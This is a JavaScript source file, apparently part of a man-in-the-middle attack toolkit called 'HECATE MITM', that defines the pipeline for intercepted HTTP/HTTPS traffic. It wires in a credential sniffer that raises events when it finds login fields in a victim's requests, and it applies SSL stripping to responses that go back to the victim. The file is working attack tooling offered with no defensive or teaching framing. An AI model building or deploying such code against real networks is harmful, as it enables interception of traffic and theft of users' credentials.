'use strict';

/**
 * HECATE MITM — Intercept Pipeline
 * Processes intercepted HTTP/HTTPS request-response pairs.
 * Pure orchestration — no I/O. Returns modified req/res objects.
 *
 * Pipeline stages (in order):
 *   Request:  1. Log  2. Sniff credentials  3. Modify (headers)
 *   Response: 1. SSL strip  2. Rewrite body  3. Log  4. Emit events
 */

const sniffer  = require('../capture/credential-sniffer');
const sslStrip = require('./ssl-strip');

let _store    = null;    // traffic-log store
let _eventBus = null;
let _config   = { stripSsl: true, sniffCredentials: true, logTraffic: true };

function setStore(s)    { _store    = s; }
function setEventBus(b) { _eventBus = b; }
function setConfig(c)   { _config   = { ..._config, ...c }; }

/**
 * Process an intercepted request before forwarding to origin.
 * @param {InterceptRequest} req
 * @returns {{ req: InterceptRequest, findings: SniffResult|null }}
 */
function processRequest(req) {
  let findings = null;

  // Credential sniffing
  if (_config.sniffCredentials) {
    findings = sniffer.sniff(req);
    if (findings) {
      _eventBus?.emit('mitm:credentials_found', {
        host:     findings.host,
        url:      findings.url,
        fields:   findings.findings.map(f => f.field),
        ts:       findings.ts,
      });
    }
  }

  return { req, findings };
}

/**
 * Process an intercepted response before returning to victim.
 * @param {InterceptResponse} res
 * @param {string} host            - target hostname
 * @returns {InterceptResponse}    - modified response
 */
function processResponse(res, host) {
  let headers = { ...res.headers };
  let body    = res.body;

  // SSL stripping
  if (_config.stripSsl) {
    headers = sslStrip.stripHeaders(headers, host);
    if (body && sslStrip.shouldStrip(headers['content-type'])) {
      body = sslStrip.stripBody(body, host);
    }
  }

  return { ...res, headers, body };
}

/**
 * Log a completed request-response pair.
 */
function logExchange(req, res, findings) {
  if (!_config.logTraffic || !_store) return;

  _store.logExchange({
    host:     req.host ?? '',
    method:   req.method,
    url:      req.url,
    reqHeaders: _sanitiseHeaders(req.headers),
    reqBody:  req.body ? req.body.slice(0, 4096) : null,  // cap stored body
    status:   res.status,
    resHeaders: _sanitiseHeaders(res.headers),
    resBody:  res.body ? res.body.slice(0, 8192) : null,
    findings,
  });
}

// Strip sensitive auth headers from stored logs
const HEADER_REDACT = new Set(['authorization', 'proxy-authorization', 'cookie', 'set-cookie']);

function _sanitiseHeaders(headers = {}) {
  const out = {};
  for (const [k, v] of Object.entries(headers)) {
    out[k] = HEADER_REDACT.has(k.toLowerCase()) ? '[REDACTED]' : v;
  }
  return out;
}

module.exports = { setStore, setEventBus, setConfig, processRequest, processResponse, logExchange };
